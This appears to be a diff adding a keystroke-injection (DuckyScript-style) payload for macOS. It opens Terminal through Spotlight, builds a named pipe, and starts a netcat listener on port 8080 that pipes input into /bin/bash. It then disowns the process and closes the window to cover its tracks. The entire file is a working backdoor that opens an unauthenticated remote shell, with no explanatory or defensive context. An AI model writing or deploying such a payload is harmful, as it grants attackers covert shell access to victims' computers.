@@ -1,0 +1,16 @@
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING mkfifo /tmp/bp
+ENTER
+STRING nc -nl 8080 </tmp/bp | /bin/bash > /tmp/bp &
+ENTER
+STRING disown
+ENTER
+STRING exit
+ENTER
+GUI q
+
+
